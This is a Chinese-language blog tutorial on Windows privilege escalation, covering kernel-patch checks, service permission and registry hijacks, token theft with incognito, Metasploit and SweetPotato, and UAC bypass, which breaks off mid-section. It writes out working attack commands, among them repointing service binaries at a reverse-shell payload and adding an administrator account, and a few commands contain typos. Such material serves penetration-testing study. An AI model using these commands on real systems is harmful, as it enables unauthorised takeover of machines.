@@ -1,0 +1,687 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>内网渗透-Windows常用提权方法 | Traveler</title>
+  <meta name="description" content="一、前言将介绍常见的提权方法。从为什么该方法能够提权（原理）到使用方法。 二、系统内核漏洞提权1.为什么能提权？内核漏洞通常是指内核溢出漏洞，什么溢出呢？缓冲区溢出。 那什么是缓冲区溢出呢？当应用程序或者是内核的驱动程序在接受用户输入的数据的时候，它会把这些数据存储在缓冲区，但是当数据过多溢出的时候，这样溢出的数据可能就会覆盖栈或者堆中的数据结构，包括函数的返回地址和权限的控制信息。攻击者就会利用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透-Windows常用提权方法">
+<meta property="og:url" content="https://ruan0423.github.io/2023/11/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-Windows%E5%B8%B8%E7%94%A8%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95/index.html">
+<meta property="og:site_name" content="Ruan❥(^_-) Blog">
+<meta property="og:description" content="一、前言将介绍常见的提权方法。从为什么该方法能够提权（原理）到使用方法。 二、系统内核漏洞提权1.为什么能提权？内核漏洞通常是指内核溢出漏洞，什么溢出呢？缓冲区溢出。 那什么是缓冲区溢出呢？当应用程序或者是内核的驱动程序在接受用户输入的数据的时候，它会把这些数据存储在缓冲区，但是当数据过多溢出的时候，这样溢出的数据可能就会覆盖栈或者堆中的数据结构，包括函数的返回地址和权限的控制信息。攻击者就会利用">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-11-04T06:43:30.000Z">
+<meta property="article:modified_time" content="2023-11-06T09:40:13.414Z">
+<meta property="article:author" content="Traveler">
+<meta property="article:tag" content="提权">
+<meta name="twitter:card" content="summary">
+  <!-- Canonical links -->
+  <link rel="canonical" href="https://ruan0423.github.io/2023/11/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-Windows%E5%B8%B8%E7%94%A8%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95/index.html">
+  
+    <link rel="alternate" href="/" title="Ruan❥(^_-) Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">Traveler</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">(((((((((((っ•ω•)っ Σ(σ｀•ω•´)σ 起飞！</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="搜索" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav menu-highlight">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">首页</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">归档</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">分类</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">标签</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">关于</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/Ruan0423" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com/" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">公告</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>欢迎交流与分享经验!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%AF%B4%E6%98%8E/">说明</a><span class="category-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget-body">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%90%86/" rel="tag">代理</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81-python-%E5%BC%80%E5%8F%91-%E8%84%9A%E6%9C%AC/" rel="tag">代码 python 开发 脚本</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8F%90%E6%9D%83/" rel="tag">提权</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%84%9A%E6%9C%AC/" rel="tag">脚本</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AF%B4%E6%98%8E/" rel="tag">说明</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/%E4%BB%A3%E7%90%86/" style="font-size: 13px;">代理</a> <a href="/tags/%E4%BB%A3%E7%A0%81-python-%E5%BC%80%E5%8F%91-%E8%84%9A%E6%9C%AC/" style="font-size: 13px;">代码 python 开发 脚本</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 13px;">信息收集</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 13px;">内网渗透</a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size: 13px;">提权</a> <a href="/tags/%E8%84%9A%E6%9C%AC/" style="font-size: 13px;">脚本</a> <a href="/tags/%E8%AF%B4%E6%98%8E/" style="font-size: 13px;">说明</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">十一月 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/10/">十月 2023</a><span class="archive-list-count">4</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/python/">python</a>
+              </p>
+              <p class="item-title">
+                <a href="/2023/11/06/python%E8%84%9A%E6%9C%AC%E4%B9%8Brequests%E5%BA%93%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6/" class="title">python脚本之requests库上传文件</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-11-06T12:56:15.000Z" itemprop="datePublished">2023-11-06</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+              </p>
+              <p class="item-title">
+                <a href="/2023/11/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-Windows%E5%B8%B8%E7%94%A8%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95/" class="title">内网渗透-Windows常用提权方法</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-11-04T06:43:30.000Z" itemprop="datePublished">2023-11-04</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+              </p>
+              <p class="item-title">
+                <a href="/2023/11/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/" class="title">内网渗透-隧道搭建</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-11-02T10:49:44.000Z" itemprop="datePublished">2023-11-02</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+              </p>
+              <p class="item-title">
+                <a href="/2023/10/30/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E7%B2%BE%E7%AE%80%E8%AF%A6%E7%BB%86%E7%AF%87/" class="title">内网渗透-信息收集(精简详细篇)</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-10-30T04:29:45.000Z" itemprop="datePublished">2023-10-30</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/python/">python</a>
+              </p>
+              <p class="item-title">
+                <a href="/2023/10/29/python%E4%B9%8Bre%E5%BA%93%EF%BC%8C%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE/" class="title">python之re库，正则表达</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-10-29T09:02:41.000Z" itemprop="datePublished">2023-10-29</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-内网渗透-Windows常用提权方法" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      内网渗透-Windows常用提权方法
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2023/11/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-Windows%E5%B8%B8%E7%94%A8%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95/" class="article-date">
+	  <time datetime="2023-11-04T06:43:30.000Z" itemprop="datePublished">2023-11-04</time>
+	</a>
+</span>
+        
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+  </span>
+
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link-link" href="/tags/%E6%8F%90%E6%9D%83/" rel="tag">提权</a>
+  </span>
+
+
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2023/11/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-Windows%E5%B8%B8%E7%94%A8%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95/#comments" class="article-comment-link">评论</a></span>
+        
+	
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 3.1k(字)</span>
+	
+	
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 12(分)</span>
+	
+
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>将介绍常见的提权方法。从为什么该方法能够提权（原理）到使用方法。</p>
+<h1 id="二、系统内核漏洞提权"><a href="#二、系统内核漏洞提权" class="headerlink" title="二、系统内核漏洞提权"></a>二、系统内核漏洞提权</h1><h2 id="1-为什么能提权？"><a href="#1-为什么能提权？" class="headerlink" title="1.为什么能提权？"></a>1.为什么能提权？</h2><p>内核漏洞通常是指内核溢出漏洞，什么溢出呢？缓冲区溢出。</p>
+<p>那什么是缓冲区溢出呢？当应用程序或者是内核的驱动程序在接受用户输入的数据的时候，它会把这些数据存储在缓冲区，但是当数据过多溢出的时候，这样溢出的数据可能就会覆盖栈或者堆中的数据结构，包括函数的返回地址和权限的控制信息。攻击者就会利用操作输入的数据来覆盖代替内核的关键数据结构。将恶意代码植入到内核内存中。从来达到提权。</p>
+<p>当存在这种漏洞的时候，要及时打上补丁。当然这里就是利用没有打上补丁的系统去提权。主要就是信息收集。</p>
+<h2 id="2-手动寻找可利用的漏洞"><a href="#2-手动寻找可利用的漏洞" class="headerlink" title="2.手动寻找可利用的漏洞"></a>2.手动寻找可利用的漏洞</h2><p>使用命令去查看系统打了哪些补丁。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line">或者</span><br><span class="line">wmic qfe get caption , description , hotfixid ,installedon</span><br></pre></td></tr></table></figure>
+
+<p>再去<a target="_blank" rel="noopener" href="https://i.hacking8.com/tiquan/%E6%88%96%E8%80%85http://blog.neargle.com/win-powerup-exp-index/%E8%BF%9B%E8%A1%8C%E6%9F%A5%E8%AF%A2%E6%9C%AA%E5%AE%89%E8%A3%85%E8%A1%A5%E4%B8%81%E6%88%96%E6%90%9C%E7%B4%A2%E5%8F%AF%E7%94%A8exp">https://i.hacking8.com/tiquan/或者http://blog.neargle.com/win-powerup-exp-index/进行查询未安装补丁或搜索可用exp</a></p>
+<h2 id="3-自动寻找"><a href="#3-自动寻找" class="headerlink" title="3.自动寻找"></a>3.自动寻找</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</span><br><span class="line">使用Windows-Exploit-Suggester</span><br><span class="line">1 ./windows-exploit-suggester.py --update</span><br><span class="line">2 使用systeminfo获取系统信息，将其保存，如1.txt</span><br><span class="line">3 ./windows-exploit-suggester.py --database 2023-11-04-mssb.xls --systeminfo 1.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="三、系统服务提权"><a href="#三、系统服务提权" class="headerlink" title="三、系统服务提权"></a>三、系统服务提权</h1><h2 id="1-为什么系统服务能提权？"><a href="#1-为什么系统服务能提权？" class="headerlink" title="1.为什么系统服务能提权？"></a>1.为什么系统服务能提权？</h2><p>windows系统服务在操作系统启动时运行，并在后台调用可执行文件。但是大多数服务都是以system的权限启动的，如果让这个服务启动时区启动其他的程序，该程序就会随着服务的启动获得系统权限。因此，如果一个低权限的用户对此类系统服务调用的可执行文件拥有写权限，就可以将该文件替换成任意可执行文件，并随着系统服务的启动获得系统权限。</p>
+<p>现在有哪些不安全的系统服务能提权呢？</p>
+<h2 id="2-不安全的服务权限"><a href="#2-不安全的服务权限" class="headerlink" title="2.不安全的服务权限"></a>2.不安全的服务权限</h2><p>什么是服务权限，就是对服务操作的权限。ACL定义了安全对象的访问控制策略，就是规定哪些用户有些什么样的权限，常见的如下表。其中呢对服务的权限控制呢可能就疏忽了，给用户配置了 SERVICE_CHANGE_CONFIG （更改服务配置权限）或者 SERVICE_ALL_ACCESS(完全控制权限)。也即是说，当这个用户有这两个权限之一，他就可以修改这个服务的启动时候的二进制文件路径。让他去执行恶意文件。从而达到提权。</p>
+<table>
+<thead>
+<tr>
+<th align="left">权限</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">SERVICE_START</td>
+<td>服务启动</td>
+</tr>
+<tr>
+<td align="left">SERVICE_STOP</td>
+<td>服务暂停</td>
+</tr>
+<tr>
+<td align="left">SERVICE_PAUSE_CONTINUE</td>
+<td>服务启动或者暂停</td>
+</tr>
+<tr>
+<td align="left">SERVICE_QUERY_CONFIG</td>
+<td>查询服务配置的权限</td>
+</tr>
+<tr>
+<td align="left">SERVICE_CHANGE_CONFIG</td>
+<td>更改服务配置的权限</td>
+</tr>
+<tr>
+<td align="left">SERVICE_ALL_ACCESS</td>
+<td>完全控制权限</td>
+</tr>
+<tr>
+<td align="left"></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>那我们只要找“Authenticated Users”组和”INTERACTIVE“组的对系统服务的权限是否有SERVICE_CHANGE_CONFIG或者SERVICE_ALL_ACCESS的权限。</p>
+<p>为什么找这两个组呢？因为这两个组是计算机本地users组的成员。</p>
+<p>怎么查询呢？可以使用工具<strong>accesschk</strong></p>
+<p>使用以下命令进行查询:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe /accepteula -uwcqv &quot;Authenticated Users&quot; *</span><br><span class="line">或者</span><br><span class="line">accesschk.exe /accepteula -uwcqv &quot;INTERCTIVE&quot; *</span><br></pre></td></tr></table></figure>
+
+<p>这样就能查询该组是否有更改服务配置的权限。</p>
+<p>例如发现 InsproSvc 服务具有SERVICE_CHANGE_CONFIG的权限。那么就可以将该服务启动时执行的二进制文件替换成预先上传的攻击载荷。当服务重启攻击载荷（reverse_tcp）就会继承系统权限。如下命令进行替换</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc config Insprosvc binpath= &quot;cmd.exe /k C:\Users\Public\reverse_tcp.exe&quot;</span><br><span class="line"># 指定insprosvc服务的二进制文件路径，=后要有空格</span><br></pre></td></tr></table></figure>
+
+<p>重启服务之后就会生效。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc stop insprosvc</span><br><span class="line">sc start insprosvc</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-服务注册表权限"><a href="#3-服务注册表权限" class="headerlink" title="3.服务注册表权限"></a>3.服务注册表权限</h2><p>和2一样，如果低用户对某些服务的注册表拥有写入权限，那么就可以修改服务的启动路径为攻击载荷路径。</p>
+<p>Accesschk.exe 查看用户是否有这些权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe /accepteula -uwcqv &quot;Authenticated Users&quot; HKLM\SYSTEM\CurrentControlSet\Services</span><br></pre></td></tr></table></figure>
+
+<p>假设发现对RegSvc服务具有完全控制的权限。那么就修改路劲</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Service\RegSvc /v ImagePath /t REG_EXPAND_SAZ /d “cmd.exe /k C:\users\public\revers_tcp.exe&quot; /f</span><br></pre></td></tr></table></figure>
+
+<p>使用命令查看是否拥有重启权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe /accepteula -uwcqv &quot;Authenticated Users&quot; RegSvc</span><br></pre></td></tr></table></figure>
+
+<p>有的话重启就可提权</p>
+<h2 id="4-服务路径权限可控"><a href="#4-服务路径权限可控" class="headerlink" title="4.服务路径权限可控"></a>4.服务路径权限可控</h2><p>某个服务的二进制文件权限可以写入，那么就可以将载荷攻击文件写在那。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic service get displayname,startmode,pathname|findstr /i “Auto” | findstr /i /v “C:\Windows\”</span><br><span class="line">探测符合条件的服务</span><br></pre></td></tr></table></figure>
+
+<p>如果发现某个服务的路径可写。那么就将那个服务的可运行文件替换成同名的攻击载荷。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /root/reverse_tcp &quot;c:\program\xx\xx.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p>再重启服务即可提权。</p>
+<h2 id="5-powerup"><a href="#5-powerup" class="headerlink" title="5.powerup"></a>5.powerup</h2><p>当然上述的所有关于服务的提权，powerup中都有涉及。<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc</a></p>
+<p>详细使用参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/l1028386804/article/details/86089574?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169917767416800225535038%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=169917767416800225535038&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-86089574-null-null.142%5Ev96%5Epc_search_result_base5&utm_term=PowerUP&spm=1018.2226.3001.4187">https://blog.csdn.net/l1028386804/article/details/86089574?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169917767416800225535038%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169917767416800225535038&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-86089574-null-null.142^v96^pc_search_result_base5&amp;utm_term=PowerUP&amp;spm=1018.2226.3001.4187</a></p>
+<p>基本使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.导入模块 Import-Module .\PowerUp.ps1</span><br><span class="line">2.一键查询服务Invoke-AllChecks</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h1 id="四、令牌窃取"><a href="#四、令牌窃取" class="headerlink" title="四、令牌窃取"></a>四、令牌窃取</h1><h2 id="1-什么是令牌窃取？为什么能提权？"><a href="#1-什么是令牌窃取？为什么能提权？" class="headerlink" title="1.什么是令牌窃取？为什么能提权？"></a>1.什么是令牌窃取？为什么能提权？</h2><p>首先得知道什么是令牌？这里的令牌窃取通常是指进程的访问令牌的窃取？那什么是访问令牌？访问令牌是描述进程安全上下文的对象，包含了与该进程相关的用户账户标识和特权等信息。</p>
+<p>然后就可以通过操作一个高权限进程的访问令牌来 当做一个进程的令牌。就是说偷其他进程的令牌来用。然后就可以拥有那个令牌自身拥有的权限。</p>
+<p>能偷其他进程的访问令牌的<strong>条件</strong>：该用户必须有SeImpersonatePrivilege 和SeAssignPrimaryTokenPrivilege&#x2F;SeIncreaseQuotaPrivilege权限。而这两个权限的用户通常是系统管理员账户，web服务账户，和IIs MsSQL账户等。</p>
+<h2 id="2-直接令牌窃取（直接偷）"><a href="#2-直接令牌窃取（直接偷）" class="headerlink" title="2.直接令牌窃取（直接偷）"></a>2.直接令牌窃取（直接偷）</h2><p><strong>2.1 使用incognnito.exe</strong>。上传到主机。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">incognito.exe list_tokens -u #列举当前主机上的所有访问令牌</span><br><span class="line">incognito.exe execute -c &quot;NT AUTHORITY\SYSTEM&quot; whoami</span><br><span class="line">#-c 偷令牌，whoami 偷完后执行的命令</span><br><span class="line">incognito.exe execute -c &quot;travel-me\Bob&quot; cmd</span><br><span class="line">偷域下Bob的令牌，然后执行它的。也就是切换到Bob的用户。</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.2 使用MetaSploit 偷</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">load incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</span><br><span class="line">steal_token &lt;PID&gt; #偷上面所列进程的ID令牌</span><br></pre></td></tr></table></figure>
+
+<p>有时候system 权限也有更改不了的东西，比如Windows系统文件，那么就可以偷TrustedInstaller权限。</p>
+<p>sc start TrustedInstaller  启动服务</p>
+<p>steal_token <Pid></p>
+<h2 id="3-Potato土豆提权"><a href="#3-Potato土豆提权" class="headerlink" title="3.Potato土豆提权"></a>3.Potato土豆提权</h2><p>potato家族有很多小偷，专门偷人家的令牌。比如：Rotten Potato 烂土豆，Juicy potato 等。</p>
+<p>甜土豆集成了大多数土豆<a target="_blank" rel="noopener" href="https://github.com/uknowsec/SweetPotato">https://github.com/uknowsec/SweetPotato</a></p>
+<p>使用 命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sweetpotato.exe -a &lt;命令&gt;</span><br><span class="line"></span><br><span class="line">#比如 sweetpotato.exe -a whoami </span><br><span class="line">sweetpotato.exe -a &quot;net user test Admin&amp;1 /add&quot;</span><br><span class="line">sweetpotato.exe -a &quot;net user localgroup Administrator test /add&quot;</span><br><span class="line">添加管理员用户。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="五、绕过UAC"><a href="#五、绕过UAC" class="headerlink" title="五、绕过UAC"></a>五、绕过UAC</h1><h2 id="1-什么是UAC？绕过他为什么就能提权？"><a href="#1-什么是UAC？绕过他为什么就能提权？" class="headerlink" title="1.什么是UAC？绕过他为什么就能提权？"></a>1.什么是UAC？绕过他为什么就能提权？</h2><p>UAC （user Account Control）用户账户控制，用来管理操作系统不让他乱安程序。在安装软件的时候一般都会弹出来一个是否允许安装的提示，就是那个东西。</p>
+<p>绕过它之后咱就可以安装恶意软件了呗。然后就可以提权。但严格意义上来说也不是提权，只是绕过了这种保护机制。</p>
+<h2 id="2-通过UAC白名单绕过"><a href="#2-通过UAC白名单绕过" class="headerlink" title="2.通过UAC白名单绕过"></a>2.通过UAC白名单绕过</h2><p>什么是UAC白名单？操作系统自己有一些进程在运行的时候不需要通过验证就直接可以运行，这些程序在UAC白名单中，比如：slui.exe.taskmgr.exe等。</p>
